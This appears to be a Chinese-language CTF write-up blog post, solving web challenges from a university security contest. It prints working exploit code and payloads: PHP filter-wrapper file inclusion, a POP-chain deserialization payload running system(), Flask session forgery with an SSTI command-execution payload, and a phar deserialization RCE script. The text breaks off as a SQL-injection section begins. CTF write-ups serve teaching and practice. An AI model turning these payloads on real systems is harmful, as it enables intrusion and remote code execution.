      <link href="/post/2021-10/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E8%A5%BF%E5%AE%89%E9%82%AE%E7%94%B5%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/"/>
      <url>/post/2021-10/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E8%A5%BF%E5%AE%89%E9%82%AE%E7%94%B5%E5%A4%A7%E5%AD%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><p>第二届西安邮电大学网络安全技能大赛是我校的大型CTF比赛，本次大赛由高年级学生和西安四叶草信息技术有限公司共同供题。因比赛结束，以下解题过程均为题目复现，故不能保证完全一致，仅供参考！</p><p>复现地址：<a href="https://www.xuntctf.top/challenges">网络科技协会XuntCTF</a></p><h2 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h2><p>考点：php://filter 伪协议，pop链的构造（php魔术方法）</p><p>进入页面，直接看hint.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$flag</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>很明显的一个文件包含漏洞，通过<a href="https://segmentfault.com/a/1190000018991087">伪协议</a>进行读取 <code>flag.php</code> 内容即可获得<code>flag</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://5e4a4b8e-9123-465c-8d67-314fb70a68a9.node.xuntctf.top:8080/hint.php?flag=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>将得到的 base64 密文进行解密即可！</p><p>得到<code>flag</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">I<span class="string">&#x27;m not a real flag</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><p>提交！怎么不对？</p><p>（骚年，怎么可能这么简单，醒醒吧！）</p><p>读取首页 index.php 的源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://5e4a4b8e-9123-465c-8d67-314fb70a68a9.node.xuntctf.top:8080/hint.php?flag=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure><p>将的到的密文解密得到如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tiger</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$string</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;string;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">boss</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;boss(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Lion</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tail</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;tail = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;tail;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Monkey</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$head</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hand</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$here</span>=<span class="string">&quot;Zoo&quot;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;head = <span class="variable">$here</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Welcome to &quot;</span>.<span class="keyword">$this</span>-&gt;head.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;head)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Elephant</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nose</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nice</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$nice</span>=<span class="string">&quot;nice&quot;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice = <span class="variable">$nice</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$nice</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;nice-&gt;nose;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;zoo&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize(<span class="variable">$_POST</span>[<span class="string">&#x27;zoo&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> Monkey;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hint in hint.php!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看出这是个<code>pop</code>链漏洞（题目也可以看出！！！）</p><p><a href="https://v0w.top/2020/03/05/unsearise-POP/">pop链的简单学习</a></p><p>学习之后我们找到了这样的一条链子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Money::__wakeup -&gt; Elephant::__toString -&gt; Lion::__get -&gt; Tiger::__invoke</span><br></pre></td></tr></table></figure><p>OK！找到链子后就来生成它吧！</p><p>exp如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tiger</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$string</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$var</span> = <span class="string">&quot;system(&#x27;ls&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Lion</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tail</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;tail = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Monkey</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$head</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hand</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$here</span>=<span class="string">&quot;Zoo&quot;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;head = <span class="variable">$here</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Elephant</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nose</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nice</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$nice</span>=<span class="string">&quot;nice&quot;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nice = <span class="variable">$nice</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> Elephant;</span><br><span class="line"><span class="variable">$b</span>-&gt;nice = <span class="keyword">new</span> Lion;</span><br><span class="line"><span class="variable">$b</span>-&gt;nice-&gt;tail = <span class="keyword">new</span> Tiger;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Monkey(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>生成的序列化字符串：</p><blockquote><p>O%3A6%3A%22Monkey%22%3A2%3A%7Bs%3A4%3A%22head%22%3BO%3A8%3A%22Elephant%22%3A2%3A%7Bs%3A4%3A%22nose%22%3BN%3Bs%3A4%3A%22nice%22%3BO%3A4%3A%22Lion%22%3A1%3A%7Bs%3A4%3A%22tail%22%3BO%3A5%3A%22Tiger%22%3A2%3A%7Bs%3A6%3A%22string%22%3BN%3Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A11%3A%22system%28%27%27%29%3B%22%3B%7D%7D%7Ds%3A4%3A%22hand%22%3BN%3B%7D</p></blockquote><p>回到 index.php 将以上 payload 使用 post 给 zoo 即可成功利用漏洞</p><p>PS：这里若出现返回状态码为 500 可以用 burp 传值试一试，如果还是不行，应该就是链子的问题了！</p><h2 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h2><p>考点：flask SSTI， flask session伪造</p><p>进入页面</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">try to post &#x27;name&#x27;</span><br></pre></td></tr></table></figure><p>呵呵，你当我不敢？</p><p>直接post一手 name=ggbond</p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog2/202112062020010.png" alt="image-20211018222709490"></p><p>再测试几次，发现有可控元素，猜测 name 可能存在 SSTI ，继续post</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure><p>发现不行，完了不会了，退了重来！这次我不听它的话了！</p><p>直接 F12 打开 Network 查看响应头，发现</p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog2/202112062020011.png" alt="image-20211018223109709"></p><ol><li>进入 <code>/source</code> 查看<code>部分</code>源码(也可以通过<code>dirsearch</code>扫描得知)</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">source <span class="keyword">in</span> /source<span class="string">&quot;</span></span><br><span class="line"><span class="string">        return rsp</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@app.route(&#x27;/source&#x27;)</span></span><br><span class="line"><span class="string">def source():</span></span><br><span class="line"><span class="string">    f = open(__file__, &#x27;r&#x27;)</span></span><br><span class="line"><span class="string">    rsp = f.read()</span></span><br><span class="line"><span class="string">    f.close()</span></span><br><span class="line"><span class="string">    return rsp[rsp.index(&#x27;source&#x27;):]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@app.route(&#x27;/admin&#x27;)</span></span><br><span class="line"><span class="string">def admin_handler():</span></span><br><span class="line"><span class="string">    try:</span></span><br><span class="line"><span class="string">        role = session.get(&#x27;role&#x27;)</span></span><br><span class="line"><span class="string">        if not isinstance(role, dict):</span></span><br><span class="line"><span class="string">            raise Exception</span></span><br><span class="line"><span class="string">    except Exception:</span></span><br><span class="line"><span class="string">        return &#x27;~~~~~~hacker!&#x27;</span></span><br><span class="line"><span class="string">    if role.get(&#x27;is_admin&#x27;) == 1:</span></span><br><span class="line"><span class="string">        flag = role.get(&#x27;flag&#x27;) or &#x27;admin&#x27;</span></span><br><span class="line"><span class="string">        flag = filter(flag)</span></span><br><span class="line"><span class="string">        message = &quot;</span>%s, I hope you have a good time!your flag <span class="keyword">is</span> <span class="string">&quot; % flag</span></span><br><span class="line"><span class="string">        return render_template_string(message)</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        return &quot;</span>I don<span class="string">&#x27;t know you&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if __name__ == &#x27;</span>__main__<span class="string">&#x27;:</span></span><br><span class="line"><span class="string">    app.run(&#x27;</span><span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span><span class="string">&#x27;, port=80)</span></span><br></pre></td></tr></table></figure><ol start="2"><li>猜测 Cookie 中为 <code>flask session</code></li></ol><blockquote><p>flask session 分为三段，对第一段进行 base64 解密的到：</p><p>{“role”:{“is_admin”:0,”name”:”test”,”secret_key”:”VGgxc0BvbmUhc2VDcmV0IQ==”}}</p></blockquote><p>或者可以使用 <a href="https://github.com/noraj/flask-session-cookie-manager">flask-session-cookie-manager </a>进行解密，用法见项目 <code>README.md</code> 发现密钥为 base64 密文，解密的到密钥：<code>Th1s@one!seCret!</code></p><p>再通过分析代码可知路由 /admin 出可能存在 SSTI 漏洞，但前提是要判定你为 admin 用户，这里就需要伪造用于身份验证的 session ！开始伪造：</p><blockquote><p>payload: {“role”:{“is_admin”:1,”name”:”test”}}</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python&#123;2,3&#125; flask_session_cookie_manager&#123;2,3&#125;.py encode -s <span class="string">&#x27;Th1s@one!seCret!&#x27;</span> -t <span class="string">&#x27;&#123;&quot;role&quot;:&#123;&quot;is_admin&quot;:1,&quot;name&quot;:&quot;test&quot;&#125;&#125;&#x27;</span></span></span><br></pre></td></tr></table></figure><p>通过篡改 Cookie 中的 session 成功进入被认证 admin 身份</p><p>通过源码或这通过回显可知，ssti注入点为 session 中的 flag 键，所以</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:&#123;<span class="attr">&quot;role&quot;</span>:&#123;<span class="attr">&quot;is_admin&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;name&quot;</span>:<span class="string">&quot;test&quot;</span>,<span class="attr">&quot;flag&quot;</span>:<span class="string">&quot;&#123;&#123;config.__class__.__init__.__globals__.os.popen(\x27cat /flag\x27).read()&#125;&#125;&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> python&#123;2,3&#125; flask_session_cookie_manager&#123;2,3&#125;.py encode -s <span class="string">&#x27;Th1s@one!seCret!&#x27;</span> -t <span class="string">&#x27;&#123;&quot;role&quot;:&#123;&quot;is_admin&quot;:1,&quot;name&quot;:&quot;test&quot;,&quot;flag&quot;:&quot;&#123;&#123;config.__class__.__init__.__globals__.os.popen(\x27cat /flag\x27).read()&#125;&#125;&quot;&#125;&#125;&#x27;</span></span></span><br></pre></td></tr></table></figure><p>在构造<code>payload</code>时需要注意的是不能出现单引号，在伪造 session 的过程中单引号会丢失(这应该与它的加密原理有关），所以咱们可以用<code>十六进制\0x27</code>进行绕过。</p><p>最后篡改Cookie即可获得flag</p><h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><p>考点：http 文件上传， phar反序列化漏洞</p><p>进入页面即可看到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>,<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">photoManage</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$action</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;download&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;download();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&#x27;upload&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;upload();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">download</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(file_exists(<span class="variable">$filename</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;check(<span class="string">&#x27;&#x27;</span>,<span class="variable">$filename</span>)) &#123;</span><br><span class="line">                <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;check(<span class="variable">$file</span>,<span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">print</span>(base64_encode(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]));</span><br><span class="line">            move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;/usr/share/nginx/html/uploads/&#x27;</span> . base64_encode(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]).<span class="string">&#x27;.jpg&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/&lt;\?/&#x27;</span>,<span class="keyword">empty</span>(<span class="variable">$file</span>)?:file_get_contents(<span class="variable">$file</span>)))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;你要是图片我肯定要啊&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/flag|:/&#x27;</span>,<span class="variable">$filename</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;no way&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$con</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$shell</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$shell</span>)&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$shell</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> photoManage();</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p><a href="https://www.yuque.com/u22254338/fht20b/ccdbdv">Phar反序列化漏洞</a></p><p>通过上文的学习写出exp：</p><p>exp.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;1.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot; __HALT_COMPILER();&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> Test();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用 <code>postman</code> 进行文件上传，通过对上面文章 <code>phar 反序列化漏洞</code>的学习后，直接使用 <code>phar://</code> 协议出发<code>反序列化漏洞</code></p><p>从而实现<code>rce</code>，最后在根目录发现flag，进行读取即可！</p><h2 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h2><p>考点：sql延时盲注， sql bypass</p><p>因题目还未部署，先贴exp：</p><figure class="highlight 